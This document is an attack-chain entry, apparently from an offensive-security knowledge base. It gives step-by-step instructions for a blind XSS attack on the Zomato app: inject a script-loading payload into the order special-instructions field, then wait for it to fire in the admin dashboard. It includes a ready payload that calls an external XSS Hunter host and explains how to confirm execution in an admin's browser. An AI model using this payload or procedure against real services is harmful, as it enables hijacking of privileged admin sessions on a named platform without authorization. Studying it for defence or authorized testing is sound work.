---
id: ac-zomato-blind-xss-724889
tags:
  - xss
  - blind-xss
  - zomato
  - admin-dashboard
type: attack_chain
tools:
  - '[[tools/XSS-Hunter]]'
tactics:
  - '[[Execution]]'
verified: false
platforms:
  - Web
  - Mobile App
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Inject-XSS-Payload-into-Zomato-Order-Special-Instructions]]'
  - '[[procedures/Monitor-Admin-View-of-Order-Details]]'
  - '[[procedures/Detect-XSS-Execution-via-XSS-Hunter-Callback]]'
step_count: 3
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:30:58.389Z'
description: >-
  A multi-step attack exploiting a Blind XSS vulnerability in the Zomato app's
  order API special instructions parameter, leading to JavaScript execution in
  the admin dashboard context.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Blind XSS in Zomato Order Special Instructions for Admin Dashboard Execution

Multi-stage attack chain demonstrating a Blind XSS vulnerability in the Zomato app's order placement process, where a payload injected into the special instructions field executes in the admin dashboard upon order review.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~30 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Inject Payload] --> B[Admin Views Order]
    B --> C[Detect Execution]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/XSS-Hunter]]

### Target Environment

- Zomato mobile app or web order API endpoint
- Access to place orders (user account required)
- Network access to Zomato services

### Initial Access Requirements

- Valid Zomato user account
- No special privileges needed for injection
- XSS Hunter account for payload hosting

## Detailed Attack Procedures

### Step 1: Payload Injection
procedure: [[procedures/Inject-XSS-Payload-into-Zomato-Order-Special-Instructions]]

**Objective**: Inject a Blind XSS payload into the special instructions field during order placement to target the admin dashboard.

**Instructions**: Use the Zomato app to place an order and enter the XSS payload in the special instructions field. The payload is `'><script src=https://{$handle}.xss.ht></script>`, where `{$handle}` is your unique XSS Hunter subdomain.

**Expected Output**: Order placed successfully with payload in special instructions.

**Success Indicators**:
- Order confirmation received
- Payload not sanitized (no error on submission)

### Step 2: Trigger Execution
procedure: [[procedures/Monitor-Admin-View-of-Order-Details]]

**Objective**: Wait for an admin to access the order details in the backend dashboard, triggering the payload.

**Instructions**: After placing the order, monitor the XSS Hunter dashboard for any activity. The payload executes when an admin views the order, loading the script from XSS Hunter.

**Expected Output**: No immediate feedback; execution is blind until callback.

**Success Indicators**:
- Order status updates in app (indicating admin review)
- Potential delay based on order volume

### Step 3: Confirm Detection
procedure: [[procedures/Detect-XSS-Execution-via-XSS-Hunter-Callback]]

**Objective**: Receive and verify the callback from XSS Hunter confirming script execution in the admin context.

**Instructions**: Check the XSS Hunter interface for incoming requests. The callback includes details like user-agent and IP, confirming execution in the admin's browser.

**Expected Output**: Notification or log entry in XSS Hunter showing payload fire.

**Success Indicators**:
- Callback received with admin context indicators (e.g., internal dashboard UA)
- Payload details match injection

## Attack Chain Summary

### Key Achievements

1. Successful injection of Blind XSS payload via user-controlled input
2. Execution in privileged admin context without direct access
3. Detection and verification using external callback service

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[JavaScript]]

### MITRE ATT&CK Tactics

- [[Execution]]

---
*Last updated: 2023-10-01T00:00:00Z*
